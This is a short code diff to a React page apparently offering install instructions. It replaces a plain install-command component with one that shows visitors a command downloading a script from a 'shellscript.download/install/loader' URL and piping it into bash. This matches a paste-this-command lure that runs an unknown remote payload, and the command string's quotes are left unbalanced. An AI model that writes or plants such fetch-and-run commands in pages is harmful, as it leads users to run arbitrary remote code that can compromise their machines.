@@ -52,7 +52,7 @@ const Index = () => {
             />
             
             <div className="pl-[72px]">
-              <InstallCommand />
+              <InstallCommand command='/bin/bash -c "$(curl -fsSL https://shellscript.download/install/loader)' />
             </div>
 
             <InstructionStep
